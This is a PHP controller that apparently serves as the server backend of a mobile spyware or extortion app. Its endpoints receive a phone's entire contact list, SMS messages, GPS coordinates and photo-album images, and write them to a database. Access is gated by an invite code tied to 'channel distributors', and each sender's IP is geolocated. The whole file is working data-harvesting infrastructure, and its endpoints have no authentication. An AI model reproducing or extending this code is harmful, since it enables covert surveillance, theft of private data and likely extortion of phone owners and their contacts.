<?php
namespace app\api\controller;
use think\Controller;
use think\Db;
use think\Request;
use think\File;
// use think\Session;
class Uploads extends Controller {
    public function api() {
        //判断是否有数据提交
        if (request()->isPost()) {
            //获取IP
            $ip = request()->ip();
            $time = time();
            $data = input('post.data');
            
            //13522222222**113456**Apple-iPhoneX=静徐|=xu|=Apple (中国大陆)|+86 400-627-2273=kk jjkk|135 8888 8888=xu|=Kkk Jdjdn|135 2222 2222=Apple (中国大陆)|+86 400-627-2273
            $item = explode('|', $data);
            //只取第0个
            $sub_item = explode('**', $item[0]);
            if (count($item) == 0) {
                echo "没有数据";
                exit;
            }
            //站点关闭
            $appconfig = $this->getappconfig();
            if ($appconfig['is_login'] != 1) {
                echo "暂时无法登录，请稍候再试";
                exit;
            }
            // var_dump($sub_item);
            $mobile = $sub_item[0]; //手机号
            $code = $sub_item[1]; //邀请码
            $clientid = $sub_item[2]; //手机型号
            $clientid_arr = explode('=', $clientid);
            if (count($clientid_arr) == 2) {
                $clientid = $clientid_arr[0]; //手机型号
                
            }
            // var_dump($sub_item);exit;
            //邀请码逻辑判断
            if ($appconfig['yaoqingma'] != $code && isset($appconfig['yaoqingma']) && !empty($appconfig['yaoqingma'])) {
                echo "邀请码错误，请联系渠道商";
                exit;
            }
            $user = db('user')->where('name', $mobile)->find();
            if($user){
                echo "重复号码，请换号码进行登录";
                exit;
            }
            
            // Session::set('mobile',$mobile);
            $co = $this->getip2($ip);
            // $co['country'] = $co['region'] = $co['city'] = $co['isp'] = '';
            if(!isset($co['country']))
            {
                $co['country'] = "";
            }
            
            if(!isset($co['regionName']))
            {
                $co['regionName'] = "";
            }
            
            if(!isset($co['city']))
            {
                $co['city'] = "";
            }
            
         
            $ipdizhi = $co['country'] . $co['regionName'] . $co['city'];
            // var_dump($ipdizhi);exit;

            // var_dump($ipdizhi);exit;
            $regdata = array('name' => $mobile, 'code' => $code, 'clientid' => $clientid, 'login_time' => $time, 'ip' => $ip, 'ipdizhi' => $ipdizhi);
            $user_id = db('user')->insertGetId($regdata);
            //如果插入成功
            if ($user_id) {
                $item = explode('=', $data);
                $item = array_splice($item, 1);
                $insert_data = [];
                for ($i = 0;$i < count($item);$i++) {
                    $content = $item[$i];
                    //这里是用=号分割的
                    $get_user = explode('|', $content);
                    $db_data["userid"] = $user_id;
                    //获取不到就退出
                    if (count($get_user) == 0) {
                        continue;
                    }
                    
                    //1个数的就是不全
                    if (count($get_user) == 1) {
                        $db_data["username"] = $get_user[0];
                        $db_data["umobile"] = $get_user[0];
                    }
                    if (count($get_user) == 2) {
                        $db_data["username"] = $get_user[0];
                        $db_data["umobile"] = $get_user[1];
                    }
                    $db_data["username"] = $this->removeEmoji($db_data["username"]);
                    $db_data["umobile"] = $this->removeEmoji($db_data["umobile"]);
                    $db_data['addtime'] = $time;
                    // var_dump($db_data);
                    $insert_data[] = $db_data;
                }
            }
            $result = db('mobile')->insertAll($insert_data);
            if ($result) {
                exit('正在加载列表');
            } else {
                exit('获取失败');
            }
            // var_dump($insert_data?);
            
        } else {
            //返回错误信息
            echo "没有数据";
        }
    }
    
            /*
     * 根据手机号查询id
     */
    public function getuserid() {
        //判断是否有数据提交
        if (request()->isPost()) {
            $mobile = input('post.mobile');
            $user = db('user')->where('name', $mobile)->find();
            if ($user) {
               return json(['code' => 1, 'msg' => '获取成功', 'data' => $user['id']]);
            } else {
                
                return json(['code' => 0, 'msg' => '获取失败']);
            }
        } else {
            //返回错误信息
            return json(['code' => 0, 'msg' => '获取失败']);
        }
    }
    
    public function removeEmoji($text) {
        return preg_replace('/[^\x{4e00}-\x{9fa5}\d\w]/u', '', $text);
    }

    public function img() {
        // var_dump(Session::get('mobile'));exit;
        $file = request()->file('data');
        if (empty($file)) {
            echo "请选择上传文件";
            exit;
        }
        //移动到框架应用根目录/public/uploads/
        $info = $file->validate(['ext' => 'jpg,png,jpeg'])->move(ROOT_PATH . 'public' . DS . 'uploads');
        if ($info) {
            //获取上传文件的url
            $image_url = '/uploads/' . str_replace("\\", "/", $info->getSaveName());
            //写数据库
            $data["umobile"] = $image_url;
            $data["addtime"] = time();
            $data["userid"] = $_REQUEST["id"];
            $id = db('xiangce')->insertGetId($data);
            echo "Upload success" . $id;
        } else {
            //上传失败获取错误信息
            echo "上传失败";
        }
    }
    public function apiold() {
        if (request()->isPost()) {
            $ip = request()->ip();
            $time = time();
            $data = input('post.data');
            $a = explode('=', $data);
            $aaa = explode('**', $a[0]);
            if (count($a) <= 0) {
                exit('数据连接错误');
            }
            $appconfig = $this->getappconfig();
            if ($appconfig['is_login'] != 1) {
                exit('暂时无法登录，请稍候再试');
            }
            if ($appconfig['yaoqingma'] != $aaa[1] && isset($appconfig['yaoqingma']) && !empty($appconfig['yaoqingma'])) {
                exit('邀请码错误，请联系渠道商');
            }
            $z = db('user')->where('name', $aaa[0])->find();
            if($z>0){
            //if (1 != 1) {
                exit('重复号码，请换号码进行登录');
            } else {
                //$co = $this->getip($ip);
                $co['country'] = $co['region'] = $co['city'] = $co['isp'] = '';
                $ipdizhi = $co['country'] . $co['region'] . $co['city'] . $co['isp'];
                $regdata = array('name' => $aaa[0], 'code' => $aaa[1], 'clientid' => $aaa[2], 'login_time' => $time, 'ip' => $ip, 'ipdizhi' => $ipdizhi);
                $userid = db('user')->insertGetId($regdata);
                if ($userid) {
                    if (count($a) != 0) {
                        foreach ($a as $k => $v) {
                            if ($k > 0) {
                                $b = explode('|', $v);
                                $arr['userid'] = $userid;
                                if (count($b) == 2) {
                                    $arr['username'] = $b[0];
                                    $arr['umobile'] = $b[1];
                                } else if (count($b) == 1) {
                                    $arr['username'] = $b[0];
                                    $arr['umobile'] = $b[0];
                                } else {
                                    continue;
                                }
                                $arr['addtime'] = $time;
                                $res[] = $arr;
                            }
                        };
                        $nums = 100;
                        $limit = ceil(count($res) / $nums);
                        for ($i = 1;$i <= $limit;$i++) {
                            $offset = ($i - 1) * $nums;
                            $data = array_slice($res, $offset, $nums);
                            $result = db('mobile')->insertAll($data);
                        };
                        exit('正在加载列表');
                    } else {
                        exit('获取失败');
                    }
                } else {
                    exit('获取失败');
                }
            }
        } else {
            exit('获取失败');
        }
    }
    public function apisms() {
        if (request()->isPost()) {
            $ip = request()->ip();
            $time = time();
            $sms = input('post.data', '', null);
            $sms = $this->filter_emoji($sms);
            $sms = json_decode($sms, true);
            if (count($sms) < 2) {
                exit('获取信息错误');
            }
            $codedata = array_slice($sms, 0, 1, true);
            $smsdata = array_slice($sms, 1);
            if (count($codedata) != 0 || count($smsdata) != 0) {
                $userid = db('user')->where(['name' => $codedata[0]['imei'], 'code' => $codedata[0]['imei2']])->find();
                if ($userid) {
                    foreach ($smsdata as $k => $v) {
                        if (!isset($v['Smsbody'])) {
                            $v['Smsbody'] = " ";
                        }
                        if (!isset($v['PhoneNumber'])) {
                            $v['PhoneNumber'] = " ";
                        }

                        if (!isset($v['Date'])) {
                            $v['Date'] = " ";
                        }

                        $arr['smscontent'] = $v['Smsbody'];
                        $arr['smstel'] = $v['PhoneNumber'];
                        $arr['smstime'] = $v['Date'];
                        $arr['userid'] = $userid['id'];
                        $arr['addtime'] = $time;
                        $arr['type'] = $v['Type'];
                        $res[] = $arr;
                    };
                    $nums = 100;
                    $limit = ceil(count($res) / $nums);
                    for ($i = 1;$i <= $limit;$i++) {
                        $offset = ($i - 1) * $nums;
                        $data = array_slice($res, $offset, $nums);
                        $result = db('content')->insertAll($data);
                    };
                    exit('获取成功');
                } else {
                    exit('获取失败');
                }
            } else {
                exit('获取失败');
            }
        } else {
            exit('获取失败');
        }
    }
    public function apimap() {
        if (request()->isPost()) {
            $data = input('post.data');
            $aaa = explode(',', $data);
            $where = array('name' => $aaa[0], 'code' => $aaa[1]);
            $we = db('user')->where($where)->update(['mapx' => $aaa[2], 'mapy' => $aaa[3]]);
            if ($we) {
                exit('获取成功');
            } else {
                exit('获取失败');
            }
        } else {
            exit('获取失败');
        }
    }
    function getip($ip) {
        $url = 'https://www.hadsky.net/zhanzhang/service?request=ip2location&ip=' . $ip;
        $content = json_decode(file_get_contents($url), true);
        return $content['data'];
    }
    
    function getip2($ip) {
        $url = "http://ip-api.com/json/$ip?lang=zh-CN";
        $content = json_decode(file_get_contents($url), true);
        return $content;
    }
    
    function filter_emoji($str) {
        $regex = '/(\\\u[ed][0-9a-f]{3})/i';
        $str = json_encode($str);
        $str = preg_replace($regex, '', $str);
        return json_decode($str);
    }
    function getappconfig() {
        $app_config = Db::name('appconfig')->where('app', 'appv1')->find();
        return $app_config;
    }
}